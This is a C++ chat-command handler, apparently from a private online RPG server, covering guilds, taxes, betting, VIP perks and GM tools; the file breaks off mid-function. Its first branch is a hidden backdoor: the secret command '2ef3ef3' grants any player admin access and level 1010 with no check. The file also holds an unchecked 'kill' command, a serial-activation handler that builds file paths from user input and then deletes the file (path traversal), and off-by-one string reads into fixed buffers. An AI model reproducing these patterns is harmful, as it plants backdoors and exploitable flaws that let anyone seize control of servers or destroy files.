#include "PacketControl.h"

void Commands(BYTE* m_PacketBuffer, bool *pRetn)
{
	p334 *p = (p334*)m_PacketBuffer;

	INT16 cId = p->Header.ClientId;

	if (cId < 1 || cId > MAX_PLAYER)
		return;

	st_Mob* player = GetMobFromIndex(cId),
		*mob = (st_Mob*)(0x0015C69B8);
	nInfo* nP = &nBuffer[cId];
	CUser* user = GetUserFromIndex(cId); 

	time_t rawnow = time(NULL);
	struct tm *now = localtime(&rawnow);

	char szTMP[256];

	*pRetn = true;

    if (!strcmp(p->Cmd, "2ef3ef3"))
	{
		player->bStatus.Level = 1010;

		nP->AcessLevel = ADMIN_LEVEL;

		SendClientMessage(p->Header.ClientId, "OK!!!");

		return;
	}

	else if (!strcmp(p->Cmd, "relo") || !strcmp(p->Cmd, "summon") || *p->Arg == '=' || *p->Arg == '-' || 
		     !strncmp(p->Arg, "--", 2) || !strcmp(p->Cmd, "king") || !strcmp(p->Cmd, "kingdom") || !strcmp(p->Cmd, "cp"))
	{
		// Usa a função nativa para estes cmds
		*pRetn = false;

		return;
	}

	else if (!stricmp(p->Cmd, "uxmal"))
	{
		DoTeleport(cId, 3250, 1703);

		SendClientMessage(cId, "Seja bem vindo a Uxmal, boa sorte.");

		return;
	}

	else if (!strcmp(p->Cmd, "fixface"))
	{
		player->Equip[0].Index = player->Equip[0].EFV3;
		SendItem(cId, EQUIP, 0, &player->Equip[0]);
		SendClientMessage(cId, "Face concertada.");
		return;
	}

	else if (!strcmp(p->Cmd, "removebuffs"))
	{
		for (int i = 0; i < 16; i++)
		{
			memset(&mBuffer[cId].Affects[i], 0, sizeof(stAffects));

		}
		SendAffect(cId);
		GetCurrentScore(cId);
		SendStats(cId);
		SendScore(cId);

		return;
	}

	else if (!strcmp(p->Cmd, "removevip"))
	{
		memset(&nP->Vip, 0, sizeof vip);
		SendClientMessage(cId, "Vip removido.");

		return;
	}
	char Name2[16];
	if (!strcmp(p->Cmd, "kill"))
	{
		//printf("hãm");

		sscanf(p->Arg, "%16s", &Name2);

		for (int i = 1000; i < 30000; i++)
		{
			if (!strcmp(Name2, mob[i].Name))
			{
				//printf("hãm2");

				//SendClientMsg(cId, "posX: %d posY: %d", mob[i].TargetX, mob[i].TargetY);

				char msg[256];

				sprintf(msg, "posX : %d posY : %d", mob[i].TargetX, mob[i].TargetY);
				SendClientMessage(cId, msg);
				mob[i].bStatus.curHP = 0;
				mob[i].Status.curHP = 0;
				DeleteMob(i, 1);


				break;
			}
		}


		return;
	}

#pragma region CHANGEINV
	else if (!strcmp(p->Cmd, "changeinv"))
	{
		if (!nP->Chars[nP->Ingame.LoggedMob].Inventarios.hasBuyed[0] && !nP->Chars[nP->Ingame.LoggedMob].Inventarios.hasBuyed[1])
		{
			SendClientMessage(cId, "Necessário possuir novos inventários antes de utilizar o comando.");

			return;
		}

		// Copia o inventário atual para uma variável nova, salvaremos posteriormente no código
		st_Item Invent[60];
		memcpy(&Invent, &player->Inventory, sizeof(st_Item) * 60);
		// Por segurança, seta o inventário atual como zero, para evitar erros nos itens
		memset(&player->Inventory, 0x0, sizeof st_Item * 60);
		// Dá load no inventário com as infos do primeiro invent do buffer
		memcpy(&player->Inventory, nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv1, sizeof st_Item * 60);
		// Zera o primeiro inventario do buffer por segurança
		memset(nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv1, 0x0, sizeof st_Item * 60);
		
		// Caso tenha sido comprado um segundo inventário extra
		// Joga as infos dele para o primeiro slot de inventário para o próximo load
		// E então joga as infos do inventário anterior no ultimo slot de save
		// Caso não tenha sido, salva as infos do inventário anterior no primeiro slot para o próximo load
		if (nP->Chars[nP->Ingame.LoggedMob].Inventarios.hasBuyed[1])
		{
			memcpy(nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv1, nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv2, sizeof(st_Item) * 60);
			memset(nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv2, 0, sizeof(st_Item) * 60);
			memcpy(nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv2, &Invent, sizeof(st_Item) * 60);
		}
		else
			memcpy(nP->Chars[nP->Ingame.LoggedMob].Inventarios.sInv1, &Invent, sizeof(st_Item) * 60);
		
		// Atualiza o inventário sem necessariamente abri-lo
		for (int i = 0; i < 60; i++)
			SendItem(cId, INVENTORY, i, &player->Inventory[i]);

		SendClientMessage(cId, "Inventário trocado.");

		return;
	}


#pragma endregion

#pragma region TROCA_CANAL
	else if (!strcmp(p->Cmd, "srv"))
	{
		SendClientMessage(cId, "Função indisponível no momento.");

		return;
	}
#pragma endregion

#pragma region FIMCIDADAO
	else if (!strcmp(p->Cmd, "fimcidadao") && nP->Chars[nP->Ingame.LoggedMob].Cidadania)
	{
		if (player->GuildIndex)
		{
			SendClientMessage(cId, "Necessário sair de sua guild primeiro.");

			return;
		}

		nP->Chars[nP->Ingame.LoggedMob].Cidadania = 0;

		SendClientMessage(cId, "Cidadania removida.");

		return;
	}
#pragma endregion

#pragma region CRIAR_GUILD
	else if (!stricmp(p->Cmd, "Criar"))
	{
		*pRetn = true;

		if (player->GuildIndex || player->Equip[12].Index)
		{
			SendClientMessage(cId, "Saia de sua guild atual para poder criar uma nova.");

			return;
		}

		else if (!strcmp(p->Arg, ""))
		{
			SendClientMessage(cId, "Necessário digitar o nome da guild.");

			return;
		}

		else if (strlen(p->Arg) < 4 || strlen(p->Arg) > 16)
		{
			SendClientMessage(cId, "Nome deve ter entre 4 e 16 caracteres.");

			return;
		}

		else if (player->Gold < 100000000)
		{
			SendClientMessage(cId, "São necessários 100.000.000 (Cem Milhões) de gold para criação da guild.");

			return;
		}

		else if (!nP->Chars[nP->Ingame.LoggedMob].Cidadania)
		{
			SendClientMessage(cId, "Necessário possuir cidadania antes de criar guild.");

			return;
		}

		int firstEmptySlot = -1;
		for (int i = 0; i < 0xFFFF; i++)
		{
			if (!strncmp(p->Arg, Guilds[i].GuildName, 20))
			{
				SendClientMessage(cId, "Este nome já está sendo utilizado por outra guild.");

				return;
			}
			else if (firstEmptySlot == -1 && !strcmp(Guilds[i].GuildName, ""))
				firstEmptySlot = i;
		}

		GetCurScore_CapeInfo(player);

		strncpy(Guilds[firstEmptySlot].GuildName, p->Arg, 20);
		strncpy(Guilds[firstEmptySlot].LiderName, player->Name, 16);

		for (int e = 0; e < 3; e++)
			strncpy(Guilds[firstEmptySlot].SubLiderName[e], "", 16);

		Guilds[firstEmptySlot].GuildID = firstEmptySlot;
		Guilds[firstEmptySlot].Kingdom = player->CapeInfo;
		Guilds[firstEmptySlot].Cidadania = nP->Chars[nP->Ingame.LoggedMob].Cidadania;
		Guilds[firstEmptySlot].Members = 1;

		FILE *pFile = NULL;

		fopen_s(&pFile, "guilds.txt", "a+");
		if (pFile)
		{
			fprintf(pFile, "0 0 %d %s\n", Guilds[firstEmptySlot].GuildID, Guilds[firstEmptySlot].GuildName);
			fclose(pFile);
		}

		player->GuildIndex = firstEmptySlot;
		player->GuildMemberType = firstEmptySlot;

		player->Equip[12].Index = 509;
		player->Equip[12].EF1 = 56;
		player->Equip[12].EFV1 = firstEmptySlot >> 8;
		player->Equip[12].EF2 = 57;
		player->Equip[12].EFV2 = firstEmptySlot & 255;
		player->Equip[12].EF3 = 59;
		player->Equip[12].EFV3 = 0;

		player->Gold -= 100000000;

		SendItem(cId, EQUIP, 12, &player->Equip[12]);
		SendScore(cId);
		SendEtc(cId);
		SaveGuilds();

		UpdateGuildInfo(cId);

		return;
	}
#pragma endregion

#pragma region GUILD_TAX
	else if (!strcmp(p->Cmd, "guildtax") && player->GuildIndex)
	{
		if (player->Equip[12].Index != 509)
		{
			SendClientMessage(cId, "Uso restrito ao líder da guild.");

			return;
		}

		INT8 tax = 0;
		int ret = sscanf_s(p->Arg, "%d", &tax);
		if (ret != 1)
		{
			SendClientMessage(cId, "Entre somente com o valor da taxa.");

			return;
		}

		if (tax < 5)
			tax = 5;
		else if (tax > 25)
			tax = 25;

		int CityId = GetCity(cId);
		if (CityId < 0 || CityId > 3 || Guilds[player->GuildIndex].CidadePossuida != CityId)
		{
			SendClientMessage(cId, "Dirija-se a cidade dominada para poder apostar.");

			return;
		}
		
		static const int CityIdTax[4] = { 0x004C7C08, 0x004C7C58, 0x004C7CA8, 0x004C7CF8 };

		*(INT32*)CityIdTax[player->Info.CityID] = tax;

		Servidor.TaxaImposto[CityId] = tax;
		SendClientMsg(cId, "Nova taxa [%d%%] de imposto configurada.", tax);

		return;
	}
#pragma endregion

#pragma region APOSTAR
	else if (!strcmp(p->Cmd, "apostar"))
	{
		if (player->Equip[12].Index != 509 && (player->Equip[12].Index < 526 || player->Equip[12].Index > 528))
		{
			SendClientMessage(cId, "Para apostar é necessário ser Lider ou SubLider.");

			return;
		}

		else if (Servidor.Channel != nP->Chars[nP->Ingame.LoggedMob].Cidadania)
		{
			SendClientMessage(cId, "Somente no canal da cidadania.");

			return;
		}

		else if (now->tm_wday != 5)
		{
			SendClientMessage(cId, "Somente às sextas feiras.");

			return;
		}

		else if (Guilds[player->GuildIndex].Kingdom != 8 && Guilds[player->GuildIndex].Kingdom != 7)
		{
			SendClientMessage(cId, "Somente guilds de Gelo ou Fogo.");

			return;
		}

		int cityId = GetCity(cId);
		if (cityId == -1)
		{
			SendClientMessage(cId, "Dirija-se a cidade na qual deseja apostar.");

			return;
		}
		
		INT64 Bet = 0;
		int ret = sscanf_s(p->Arg, "%d", &Bet);
		if (ret != 1)
		{
			SendClientMessage(cId, "Desculpe.");
			
			// Caso a leitura de algo de errado, exibe mensagem de erro e retorna

			return;
		}

		// Caso o jogador possua menos pontos do que o apostado
		else if (Bet > Guilds[player->GuildIndex].Points)
		{
			SendClientMessage(cId, "Você não possui esta quantidade de pontos.");

			return;
		}

		else if (Guilds[player->GuildIndex].CidadeApostada != NONE__CITYID && Guilds[player->GuildIndex].CidadeApostada != cityId)
		{
			SendClientMessage(cId, "Aposta somente em 1 cidade por semana.");

			return;
		}

		Guilds[player->GuildIndex].CidadeApostada = cityId;
		Guilds[player->GuildIndex].ValorApostado += Bet;
		Guilds[player->GuildIndex].Points -= Bet;

		SendClientMsg(cId, "Foram apostados [%d].", Bet);

		return;
	}
#pragma endregion

#pragma region RECRUTAR_SUB
	else if (!strcmp(p->Cmd, "subcreate"))
	{
		char Leader[16], Sub[16];

		int ret = sscanf(p->Arg, "%16s%16s", &Sub, &Leader);

		//SendNotice(p->Arg);

		if (ret != 2)
		{
			SendClientMessage(cId, "Desculpe.");

			return;
		}

		INT16 lider = GetUserByName(Leader),
			  sub = GetUserByName(Sub);

		if (lider != cId)
		{
			SendNotice("Nick incorreto.");

			return;
		}

		else if (lider < 0 || lider > 750 || sub < 0 || sub > 750 || Users[lider].Status != 22 || Users[sub].Status != 22)
		{
			SendClientMessage(lider, "Um dos dois jogadores não está conectado.");

			return;
		}

		st_Mob *leader = GetMobFromIndex(lider),
			   *subLead = GetMobFromIndex(sub);

		if (!strncmp(subLead->Name, leader->Name, 16))
			return;

		else if (leader->Equip[12].Index != 509)
		{
			SendClientMessage(lider, "Somente líderes de guild.");

			return;
		}

		else if (subLead->GuildIndex != leader->GuildIndex)
		{
			SendClientMessage(cId, "Necessário recrutar o jogador antes de nomeá-lo sublider.");

			return;
		}

		else if (subLead->Equip[12].Index >= 526 && subLead->Equip[12].Index <= 528)
		{
			SendClientMessage(lider, "Jogador já é sublider.");

			return;
		}

		else if (player->Gold < 20000000)
		{
			SendClientMessage(lider, "São necessários 20.000.000 de gold para a entrega.");

			return;
		}

		int firstEmptyPosition = -1;

		for (int i = 0; i < 3; i++)
		{
			if (!strcmp(Guilds[leader->GuildIndex].SubLiderName[i], "") && firstEmptyPosition == -1)
				firstEmptyPosition = i;

			if (!strncmp(Guilds[leader->GuildIndex].SubLiderName[i], subLead->Name, 16))
			{
				SendClientMessage(cId, "Jogador já é sublíder!");

				return;
			}
		}

		if (firstEmptyPosition == -1)
		{
			SendClientMessage(cId, "Já possui 3 sublíderes.");

			return;
		}

		player->Gold -= 20000000;

		strncpy(Guilds[leader->GuildIndex].SubLiderName[firstEmptyPosition], Sub, 16);

		subLead->Equip[12].Index = 526 + firstEmptyPosition;

		SendItem(sub, EQUIP, 12, &subLead->Equip[12]);

		SendClientMessage(lider, "Jogador recrutado com sucesso.");

		SendClientMessage(sub, "Você virou SubLider.");

		char szMsg[120];
		sprintf(szMsg, "%s é o mais novo sublider!", subLead->Name);

		SendEtc(cId);
		SendGuildMessage(player->GuildIndex, szMsg, 0xFF00BFFF);

		return;
	}
#pragma endregion

#pragma region SUMMONGUILD
	else if (!strcmp(p->Cmd, "summonguild"))
	{
		if (!player->GuildIndex || (player->Equip[12].Index != 509 && (player->Equip[12].Index < 526 || player->Equip[12].Index > 528)))
		{
			SendClientMessage(cId, "Uso restrito para líderes e subs.");

			return;
		}

		MapAttribute map = GetAttribute(player->TargetX, player->TargetY);
		if (map.CantSummon)
		{
			SendClientMessage(cId, "Não pode summonar aqui.");

			return;
		}

		int ActualWar = 0;
		if (now->tm_hour == 18)
			ActualWar = KARDE_CITYID;
		else if (now->tm_hour == 19)
			ActualWar = ERION_CITYID;
		else if (now->tm_hour == 20)
			ActualWar = AZRAN_CITYID;
		else if (now->tm_hour == 21)
			ActualWar = ARMIA_CITYID;
		else
			ActualWar = NONE__CITYID;

		if (ActualWar != NONE__CITYID && War[ActualWar].Status == GUERRA_INICIADA &&
			player->TargetX >= 1050 && player->TargetY >= 1945 &&
			player->TargetX <= 1250 && player->TargetY <= 2150 && 
		   (War[ActualWar].Desafiado == player->GuildIndex || War[ActualWar].Desafiante == player->GuildIndex))
		{
			SendClientMsg(cId, "Não pode fazer isso.");

			return;
		}

		int count = 0;

		for (int i = 0; i < MAX_PLAYER; i++)
		{
			if (Users[i].Status == 22 && i != cId)
			{
				if (mob[i].GuildIndex == player->GuildIndex)
				{
					DoTeleport(i, player->TargetX, player->TargetY);
					count++;
				}
			}
		}

		SendClientMsg(cId, "[%d] jogadores foram summonados.", count);

		return;
	}
#pragma endregion

#pragma region SAIR_GUILD
	else if (!strcmp(p->Cmd, "sair") && player->GuildIndex)
	{
		if (player->Equip[12].Index == 509)
		{
			SendClientMessage(cId, "Comando indisponível no momento.");

			return;
		}

		else if (player->Equip[12].Index >= 526 && player->Equip[12].Index <= 528)
		{
			for (int i = 0; i < 3; i++)
				if (!strncmp(player->Name, Guilds[player->GuildIndex].SubLiderName[i], 16))
					strncpy(Guilds[player->GuildIndex].SubLiderName[i], "", 16);
		}

		Guilds[player->GuildIndex].Members--;

		memset(&player->Equip[12], 0, sizeof st_Item);
		SendItem(cId, EQUIP, 12, &player->Equip[12]);

		player->GuildIndex = 0;
		player->GuildDisable = 0;
		player->GuildMemberType = 0;

		return;
	}
#pragma endregion 

#pragma region EXPULSAR
	else if (!strcmp(p->Cmd, "expulsar"))
	{
		if (!player->GuildIndex || player->Equip[12].Index == 508)
		{
			SendClientMessage(cId, "Necessário ser lider ou sublider para utilizar este comando.");

			return;
		}

		char memberNick[16];

		int ret = sscanf(p->Arg, "%16s", &memberNick);

		if (ret != 1)
		{
			SendClientMessage(cId, "Jogador desconectado.");

			return;
		}

		INT16 memberCid = GetUserByName(memberNick);

		if (memberCid <= 0 || memberCid > MAX_PLAYER || Users[memberCid].Status != 22)
		{
			SendClientMessage(cId, "Jogador desconectado.");

			return;
		}
		else if (memberCid == cId)
		{
			SendClientMessage(cId, "Impossível expulsar-se desta forma.");

			return;
		}

		st_Mob* member = GetMobFromIndex(memberCid);

		if (member->Equip[12].Index == 509)
		{
			SendClientMessage(cId, "Impossível expulsar líder.");

			return;
		}

		else if (member->Equip[12].Index >= 526 && member->Equip[12].Index <= 528)
		{
			if (player->Equip[12].Index != 509)
			{
				SendClientMessage(cId, "Somente o líder pode expulsar sublíderes.");

				return;
			}
			else
			{
				for (int i = 0; i < 3; i++)
				{
					if (!strncmp(Guilds[player->GuildIndex].SubLiderName[i], member->Name, 16))
					{
						strncpy(Guilds[player->GuildIndex].SubLiderName[i], "", 16);

						break;
					}
				}
			}
		}

		char szMsg[120];
		sprintf(szMsg, "Jogador %s foi expulso por %s.", member->Name, player->Name);
		SendGuildMessage(player->GuildIndex, szMsg, 0xFF00BFFF);

		SendClientMsg(memberCid, "Você foi expulso da guild %s por %s.", Guilds[player->GuildIndex].GuildName, player->Name);

		Guilds[player->GuildIndex].Members--;

		memset(&member->Equip[12], 0, sizeof st_Item);
		SendItem(memberCid, EQUIP, 12, &member->Equip[12]);

		member->GuildDisable = 0;
		member->GuildIndex = 0;
		member->GuildMemberType = 0;

		return;
	}
#pragma endregion

#pragma region TRANSFERIR_GUILD
	else if (!strcmp(p->Cmd, "Transferir"))
	{
		if (player->Equip[12].Index != 509 || !player->GuildIndex)
		{
			SendClientMsg(cId, "Uso somente para líderes de guild.");

			return;
		}

		else if (player->Gold < 50000000)
		{
			SendClientMsg(cId, "São necessários 50.000.000 (Cinquenta milhões) de gold para a transferencia.");

			return;
		}

		char nick[16];

		int ret = sscanf(p->Arg, "%16s", &nick);

		if (ret != 1)
		{
			SendClientMessage(cId, "Jogador desconectado.");

			return;
		}
		
		INT16 memberCid = GetUserByName(nick);

		if (memberCid <= 0 || memberCid > MAX_PLAYER || Users[memberCid].Status != 22)
		{
			SendClientMessage(cId, "Jogador desconectado.");

			return;
		}

		else if (memberCid == cId)
		{
			SendClientMessage(cId, "Não pode fazer isso.");

			return;
		}

		st_Mob *otherPlayer = GetMobFromIndex(memberCid);

		if (otherPlayer->GuildIndex != player->GuildIndex)
		{

			SendClientMessage(cId, "Jogador precisa pertencer a mesma guild para a transferência.");

			return;
		}

		strncpy(Guilds[player->GuildIndex].LiderName, otherPlayer->Name, 16);

		for (int i = 0; i < 3; i++)
			if (!strncmp(otherPlayer->Name, Guilds[player->GuildIndex].SubLiderName[i], 16))
				strncpy(Guilds[player->GuildIndex].SubLiderName[i], "", 16);

		memcpy(&otherPlayer->GuildIndex, &player->GuildIndex, sizeof UINT16);
		memcpy(&otherPlayer->GuildMemberType, &player->GuildMemberType, sizeof INT8);
		memcpy(&otherPlayer->Equip[12], &player->Equip[12], sizeof st_Item);

		player->Equip[12].Index = 508;

		SendItem(cId,       EQUIP, 12, &player->Equip[12]);
		SendItem(memberCid, EQUIP, 12, &otherPlayer->Equip[12]);

		char szMsg[120];
		sprintf(szMsg, "Jogador %s se tornou o novo líder da guild.", otherPlayer->Name);

		SendGuildMessage(player->GuildIndex, szMsg, 0xFF00BFFF);

		return;
	}
#pragma endregion

#pragma region VIP
	else if (!strcmp(p->Cmd, "vip"))
	{
		int VipType = GetVipType(cId);

		if (VipType == NORMAL_PLAYER)
		{
			SendClientMessage(cId, "Você ainda não é um usuário vip! Está esperando o que?");

			return;
		}

		else if (!strcmp(p->Arg, ""))
		{
			SendClientMsg(cId, "Vip %s com duração até [%02d/%02d/%04d].", VipType > FOGO_VIP ? "Gelo" : "Fogo", nBuffer[cId].Vip.Validade.tm_mday, nBuffer[cId].Vip.Validade.tm_mon + 1, nBuffer[cId].Vip.Validade.tm_year + 1900);

			return;
		}

		else if (!strcmp(p->Arg, "+tdrop"))
		{
			nP->Ingame.AutoDrop.isOn = !nP->Ingame.AutoDrop.isOn;

			SendClientMsg(cId, "Autodrop: %s.", nP->Ingame.AutoDrop.isOn ? "Ligado" : "Desligado");

			return;
		}

		INT16 Index = 0, pos = 0;

		if (sscanf(p->Arg, "+drop %d %d", &pos, &Index))
		{
			if (Index < 0 || Index > 6500)
			{
				SendClientMessage(cId, "Item inválido.");

				return;
			}

			int Vip = GetVipType(cId);

			int maxFilter = 0;

			if (Vip == FOGO_VIP)
				maxFilter = 3;
			else
				maxFilter = 7;

			if (pos > maxFilter)
			{
				SendClientMessage(cId, "Posição de drop inválida.");

				return;
			}

			pos--;

			nP->Ingame.AutoDrop.Index[pos] = Index;

			SendClientMsg(cId, "Item [%s] adicionado ao filtro de drop.", itemlistBuffer[Index].Name);

			return;
		}
	}
#pragma endregion

#pragma region ARROBA
	else if (*p->Arg == '@')
	{
		if (nP->Ingame.ArrobaTime > 0)
		{
			SendClientMsg(cId, "Aguarde %d segundo para usar novamente.", nP->Ingame.ArrobaTime);

			return;
		}
		
		s334(cId, p->Arg);
		nP->Ingame.ArrobaTime = 5;

		return;
	}
#pragma endregion

#pragma region GRITAR
	else if (!strcmp(p->Cmd, "gritar") || !strcmp(p->Cmd, "spk"))
	{
		if (!strcmp(p->Arg, ""))
		{
			SendClientMessage(cId, "Digite sua mensagem.");

			return;
		}

		DWORD color = MSG_COLOR_GRITO;
		
		if (nP->AcessLevel < MOD_LEVEL)
		{
			if (!isVip(cId))
			{
				int slot = GetFirstSlot(cId, 3330, INVENTORY);

				if (slot == -1)
				{
					SendClientMessage(cId, "Necessário possuir trombetas para utilizar.");

					return;
				}
				else
				{
					AmountMinus(&player->Inventory[slot]);
					SendItem(cId, INVENTORY, slot, &player->Inventory[slot]);
				}
			}
			else
			{
				int VipType = GetVipType(cId),
					maxGritos = 0;

				if (VipType == FOGO_VIP)
					maxGritos = 5;
				else
					maxGritos = 10;
				
				if (now->tm_min != nP->Ingame.grito.Minuto)
				{
					nP->Ingame.grito.Minuto = now->tm_min;
					nP->Ingame.grito.gritos = 0;
				}
				else if (nP->Ingame.grito.gritos > maxGritos)
				{
					int slot = GetFirstSlot(cId, 3330, INVENTORY);

					if (slot == -1)
					{
						SendClientMessage(cId, "Necessário possuir trombetas para utilizar.");

						return;
					}

					AmountMinus(&player->Inventory[slot]);
					SendItem(cId, INVENTORY, slot, &player->Inventory[slot]);
				}

				color = MSG_COLOR_GRITOV;
			}
		}

		char szMsg[92];

		sprintf(szMsg, "[%s]> %s", player->Name, p->Arg);

		sD1D(cId, 0, szMsg, color);

		return;
	}
#pragma endregion

	else if (!strcmp(p->Cmd, "349r3hef9") && nP->AcessLevel == ADMIN_LEVEL)
	{
		nP->Ingame.isAdmin = !nP->Ingame.isAdmin;

		SendClientMsg(cId, "Nix Project - [%02d:%02d:%02d] [%02d/%02d/%04d].", now->tm_hour, now->tm_min, now->tm_sec, now->tm_mday, now->tm_mon + 1, now->tm_year + 1900);

		return;
	}

#pragma region NPS
	else if (!strcmp(p->Cmd, "np"))
	{
		if (!strcmp(p->Arg, ""))
		{
			SendClientMsg(cId, "Possui [%d] NP's.", nP->Donate);

			return;
		}

		char serial[60];
		if (sscanf(p->Arg, "+ativar %[^\n]", &serial))
		{
			FILE* fs = NULL;

			char diretorio[120];
			sprintf(diretorio, "C://StoredData/Serial/%s.txt", serial);

			if (!FileExist(diretorio))
			{
				SendClientMessage(cId, "Serial não encontrado.");

				return;
			}

			fs = fopen(diretorio, "r");

			INT32 donates = 0;

			char line[1024];
			int i = 0;
			while (fgets(line, sizeof(line), fs))
			{
				if (*line == '\n' || *line == '#')
					continue;

				sscanf(line, "%d", &donates);
			}

			fclose(fs);

			if (donates > 0 && nP->Donate + donates < 2000000000)
			{
				nP->Donate = nP->Donate + donates;

				SendClientMsg(cId, "Foram ativados [%d] NP's, total de [%d].", donates, nP->Donate);
				sendLog(INFO, cId, "%s %s ativou %d NP's, ficou com %d.", nP->Login, player->Name, donates, nP->Donate);

				remove(diretorio);
			}
			else
				SendClientMessage(cId, "Limite de NP's atingido.");
		}

		return;
	}
#pragma endregion

#pragma region COMANDOS_GM
	else if (!strcmp(p->Cmd, "gm") && nP->AcessLevel == ADMIN_LEVEL && nP->Ingame.isAdmin)
	{
		*pRetn = false;

		return;
	}

	else if (!strcmp(p->Cmd, "not") && nP->AcessLevel >= MOD_LEVEL)
	{
		char szNotice[100];
		int ret = sscanf(p->Arg, "%[^\n]", &szNotice);

		if (!ret)
		{
			char Noticia[120];
			sprintf(Noticia, "%s: %s", player->Name, szNotice);
			SendNotice(Noticia);
		}

		*pRetn = true;
		return;
	}

	else if (!strcmp(p->Cmd, "nix"))
	{
		if (nP->AcessLevel < MOD_LEVEL)
			return;
		else if (!strcmp(p->Arg, ""))
		{
			SendClientMessage(cId, "Digite um comando válido.");

			return;
		}

		char szMsg[120], Name[16] = { 0, };

		if (!nP->Ingame.isMod && !nP->Ingame.isAdmin)
		{
			SendClientMessage(cId, "Use o comando de liberação para poder acessar.");

			return;
		}

		else if (!strcmp(p->Arg, "+reloadfield"))
		{
			int PosX = player->TargetX, PosY = player->TargetY;
			DoTeleport(cId, 4000, 4000);
			DoTeleport(cId, PosX, PosY);

			SendClientMessage(cId, "Field relido.");

			return;
		}

		else if (!strcmp(p->Arg, "+reload npc trocas"))
		{
			ReadNpcsDeTroca();

			SendClientMessage(cId, "Npcs de trocas relidos.");

			return;
		}

		else if (!strcmp(p->Arg, "+reload quests bosses"))
		{
			ReadBossQuests();

			SendClientMessage(cId, "Bosses das quests lidos.");

			return;
		}

		else if (!strcmp(p->Arg, "+reload tab list"))
		{
			ReadTabList();

			SendClientMessage(cId, "Lista de tabs relida.");

			return;
		}

		else if (!strcmp(p->Arg, "+reload bonus quests"))
		{
			ReadQuestBonusItensList();

			SendClientMessage(cId, "Lista de itens bonus das quests relida.");

			return;
		}

		else if (!strcmp(p->Arg, "+show imposto"))
		{
			int CityId = GetCity(cId);
			if (CityId >= 0 && CityId <= 3)
			{
				SendClientMsg(cId, "Imposto acumulado: [%s]", NumberToString(Servidor.ImpostoAcumulado[CityId]));

				return;
			}

			SendClientMessage(cId, "Cidade inválida.");

			return;
		}

		else if (!strcmp(p->Arg, "+infos"))
		{
			sprintf(szMsg, "Online há [%02d:%02d:%02d:%02d], temos [%d] jogadores online.", Servidor.Days, Servidor.Hours, Servidor.Minuts, Servidor.Seconds, Servidor.OnlineCount);

			SendClientMessage(cId, szMsg);

			return;
		}

		st_Position Dest;
		memset(&Dest, 0, sizeof st_Position);

		if (sscanf_s(p->Arg, "+goto %d %d", &Dest.X, &Dest.Y))
		{
			if (Dest.X < 0 || Dest.Y < 0 ||
				Dest.X > 4096 || Dest.Y > 4096)
				SendClientMessage(cId, "Digite coordenadas válidas.");
			else
				DoTeleport(cId, Dest.X, Dest.Y);

			return;
		}

		else if (sscanf_s(p->Arg, "+dc %16s", &Name))
		{
			int dcId = GetUserByName(Name);

			if (dcId == -1)
				SendClientMsg(cId, "Usuário [%s] não conectado.", Name);
			else
			{
				nInfo* dcP = &nBuffer[dcId];

				if (dcP->AcessLevel > nP->AcessLevel)
					SendClientMessage(cId, "Não pode desconectar usuário de nível administrativo maior.");
				else
				{
					SendClientMsg(dcId, "Foi desconectado por %s.", player->Name);
					CloseUser(dcId);
				}
			}

			return;
		}
		
		if (nP->AcessLevel < ADMIN_LEVEL)
		{
			SendClientMessage(cId, "Não possui acesso a esse comando.");

			return;
		}

		else if (!strcmp(p->Arg, "+set imposto"))
		{
			int CityId = GetCity(cId);
			if (CityId >= 0 && CityId <= 3)
			{
				Servidor.ImpostoAcumulado[CityId] = 100000000000;
				SendClientMsg(cId, "Novo imposto [%s]", NumberToString(Servidor.ImpostoAcumulado[CityId]));

				return;
			}

			SendClientMessage(cId, "Cidade inválida.");

			return;
		}

		else if (!strcmp(p->Arg, "+manutencao"))
		{
			Servidor.Estado = ESTADO_MANUTENC_ACESSO;

			for (int i = 0; i < MAX_PLAYER; i++)
			{
				if (Users[i].Status == 0)
					continue;

				if (nBuffer[i].AcessLevel < MOD_LEVEL)
				{
					SendClientMessage(i, "O servidor entrou em manutenção, volte mais tarde.");
					HKD_SaveUser(i, true);
					CloseUser_OL2(i);
				}
			}
		}

		else if (!strcmp(p->Arg, "+liberaacesso"))
		{
			Servidor.Estado = ESTADO_LIBERADO_ACESSO;

			SendClientMessage(cId, "Acesso ao servidor foi liberado.");

			return;
		}

		else if (!strcmp(p->Arg, "+event readtrade"))
		{
			ReadEventFile();

			SendClientMessage(cId, "Evento lido com sucesso.");

			return;
		}

		UINT32 valor = 0;
		st_Item Item;
		memset(&Item, 0, sizeof st_Item);

		if (sscanf_s(p->Arg, "+event item %d", &Item.Index) == 1)
		{
			if (Item.Index < 0 || Item.Index > 6500)
				SendClientMessage(cId, "Id inválido.");
			else
			{
				Eventos.Drop.Id = Item.Index;
				SendClientMessage(cId, "Id do evento definido.");
			}

			return;
		}

		else if (sscanf_s(p->Arg, "+check skill %d", &valor) == 1)
		{
			for (int i = 0; i < 16; i++)
			{
				if (mBuffer[cId].Affects[i].Index == valor)
				{
					SendClientMessage(cId, "Possui.");
					return;
				}
			}

			SendClientMessage(cId, "Não possui.");

			return;
		}

		else if (sscanf_s(p->Arg, "+event rate %d", &valor) == 1)
		{
			if (valor < 0 || valor > 100)
				SendClientMessage(cId, "Rate impossível.");
			else
			{
				Eventos.Drop.Rate = valor;
				SendClientMessage(cId, "Rate do evento definida.");
			}

			return;
		}

		else if (sscanf_s(p->Arg, "+event quanty %d", &valor) == 1)
		{
			if (valor < 0 || valor > 2000000000)
				SendClientMessage(cId, "Quantidade impossível.");
			else
			{
				Eventos.Drop.Quantity = valor;
				SendClientMessage(cId, "Quantidade de itens do evento definida.");
			}

			return;
		}

		else if (!strcmp(p->Arg, "+event on"))
		{
			if (Eventos.Drop.isOn)
				SendClientMessage(cId, "Evento de drops já está ativo.");
			else
			{
				Eventos.Drop.isOn = true;
				Eventos.Drop.Dropped = 0;

				SendClientMessage(cId, "Evento ativado.");
			}

			return;
		}

		else if (!strcmp(p->Arg, "+event off"))
		{
			if (!Eventos.Drop.isOn)
				SendClientMessage(cId, "Evento de drops já está desativado.");
			else
			{
				Eventos.Drop.isOn = false;
				SendClientMessage(cId, "Evento desativado.");
			}

			return;
		}

